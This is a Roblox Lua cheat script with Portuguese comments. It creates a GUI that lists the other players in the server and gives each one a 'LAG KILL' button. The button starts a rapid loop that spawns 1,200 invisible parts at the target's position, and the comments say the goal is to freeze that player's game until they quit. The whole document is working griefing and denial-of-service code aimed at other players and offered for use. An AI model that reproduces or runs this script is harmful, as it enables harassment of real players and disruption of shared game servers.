-- LAG KICK INFINITO GUI (Todo mundo vê o cara travar até sair - 2025)
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer

local sg = Instance.new("ScreenGui")
sg.Parent = CoreGui
sg.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 520)
frame.Position = UDim2.new(0.5, -200, 0.5, -260)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BorderColor3 = Color3.fromRGB(255, 0, 255)
frame.BorderSizePixel = 5
frame.Active = true
frame.Draggable = true
frame.Parent = sg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 50)
title.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
title.Text = "LAG KICK INFINITO (Até sair do jogo)"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBlack
title.TextSize = 22
title.Parent = frame

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -20, 1, -100)
scroll.Position = UDim2.new(0, 10, 0, 60)
scroll.BackgroundTransparency = 1
scroll.ScrollBarThickness = 8
scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 255)
scroll.Parent = frame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 8)
layout.Parent = scroll

-- Função LAG ABSURDO (trava o jogo da vítima até sair)
local function lagKill(target)
    spawn(function()
        while target and target.Parent and wait(0.01) do
            pcall(function()
                -- Cria 1000+ partes por loop (lag insano no client dele)
                for i = 1, 1200 do
                    local p = Instance.new("Part")
                    p.Size = Vector3.new(5,5,5)
                    p.Position = target.Character.HumanoidRootPart.Position
                    p.Anchored = true
                    p.Transparency = 1
                    p.CanCollide = false
                    p.Parent = workspace
                    game.Debris:AddItem(p, 0.1)
                end
                -- Força lag visual (todo mundo vê ele parado/travado)
                if target.Character then
                    target.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                    target.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
                end
            end)
        end
    end)
end

-- Atualiza lista em tempo real
local function update()
    for _, v in pairs(scroll:GetChildren()) do
        if v:IsA("TextButton") then v:Destroy() end
    end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= player then
            local btn = Instance.new("TextButton")
            btn.Size = UDim2.new(1, -10, 0, 55)
            btn.BackgroundColor3 = Color3.fromRGB(80, 0, 80)
            btn.Text = "LAG KILL " .. p.Name
            btn.TextColor3 = Color3.new(1,1,1)
            btn.Font = Enum.Font.GothamBold
            btn.TextSize = 18
            btn.Parent = scroll

            btn.MouseButton1Click:Connect(function()
                btn.Text = p.Name .. " TRAVADO!"
                btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                lagKill(p)
                print("LAG KILL ATIVADO EM " .. p.Name)
            end)
        end
    end
    scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 20)
end

-- Refresh + Fechar
local refresh = Instance.new("TextButton")
refresh.Size = UDim2.new(0.48, -10, 0, 40)
refresh.Position = UDim2.new(0, 10, 1, -50)
refresh.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
refresh.Text = "REFRESH"
refresh.TextColor3 = Color3.new(0,0,0)
refresh.Parent = frame
refresh.MouseButton1Click:Connect(update)

local close = Instance.new("TextButton")
close.Size = UDim2.new(0.48, -10, 0, 40)
close.Position = UDim2.new(0.52, 0, 1, -50)
close.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
close.Text = "FECHAR"
close.TextColor3 = Color3.new(1,1,1)
close.Parent = frame
close.MouseButton1Click:Connect(function() sg:Destroy() end)

-- Atualiza em tempo real
Players.PlayerAdded:Connect(update)
Players.PlayerRemoving:Connect(update)
update()
